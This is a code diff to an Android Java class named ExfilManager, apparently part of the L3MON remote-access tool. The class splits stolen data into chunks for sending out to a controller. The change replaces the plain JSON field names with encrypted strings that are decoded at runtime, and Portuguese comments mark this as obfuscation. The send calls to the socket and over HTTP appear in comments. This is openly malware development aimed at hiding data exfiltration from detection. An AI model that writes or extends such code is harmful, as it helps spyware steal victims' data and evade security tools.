@@ -1,8 +1,11 @@
 package com.etechd.l3mon.managers;
 
 import org.json.JSONObject;
+
 import java.util.ArrayList;
 import java.util.List;
+
+import com.etechd.l3mon.StringCrypto;
 
 public class ExfilManager {
 
@@ -14,7 +17,6 @@ public class ExfilManager {
     public static List<String> fragmentData(String data) {
         List<String> chunks = new ArrayList<>();
         int length = data.length();
-
         for (int i = 0; i < length; i += CHUNK_SIZE) {
             int end = Math.min(i + CHUNK_SIZE, length);
             chunks.add(data.substring(i, end));
@@ -31,10 +33,12 @@ public class ExfilManager {
         for (int i = 0; i < chunks.size(); i++) {
             try {
                 JSONObject fragment = new JSONObject();
-                fragment.put("chunk_index", i);
-                fragment.put("total_chunks", chunks.size());
-                fragment.put("data", chunks.get(i));
-                fragment.put("timestamp", System.currentTimeMillis());
+
+                // === CHAVES JSON CRIPTOGRAFADAS ===
+                fragment.put(StringCrypto.d("EjzoMySf593GDkjPByro3A=="), i); // "chunk_index"
+                fragment.put(StringCrypto.d("4K3a5ngZ6qGBES9m9jtxeg=="), chunks.size()); // "total_chunks"
+                fragment.put(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), chunks.get(i)); // "data"
+                fragment.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
 
                 // Envia cada fragmento
                 // ConnectionManager.ioSocket.emit(eventType, fragment);
@@ -73,14 +77,14 @@ public class ExfilManager {
              * OkHttpClient client = new OkHttpClient.Builder()
              * .protocols(Arrays.asList(Protocol.HTTP_3, Protocol.HTTP_2))
              * .build();
-             * 
+             *
              * RequestBody body = RequestBody.create(data,
              * MediaType.get("application/json"));
              * Request request = new Request.Builder()
              * .url(url)
              * .post(body)
              * .build();
-             * 
+             *
              * client.newCall(request).execute();
              */
         } catch (Exception e) {
